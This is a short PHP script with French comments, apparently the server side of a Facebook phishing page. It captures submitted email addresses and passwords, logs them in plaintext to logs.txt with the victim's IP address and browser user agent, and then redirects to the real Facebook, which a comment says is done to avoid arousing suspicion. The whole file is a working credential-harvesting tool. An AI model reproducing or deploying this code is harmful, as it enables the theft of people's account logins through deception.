<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email    = isset($_POST['email'])    ? trim($_POST['email'])    : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $ip       = $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
    $ua       = $_SERVER['HTTP_USER_AGENT'] ?? 'inconnu';
    $date     = date('Y-m-d H:i:s');

    $ligne = "[{$date}] IP: {$ip} | UA: {$ua} | Email: {$email} | Password: {$password}\n";
    file_put_contents(DIR . '/logs.txt', $ligne, FILE_APPEND | LOCK_EX);
}

// Redirige vers le vrai Facebook pour ne pas éveiller les soupçons
header('Location: https://www.facebook.com/');
exit;
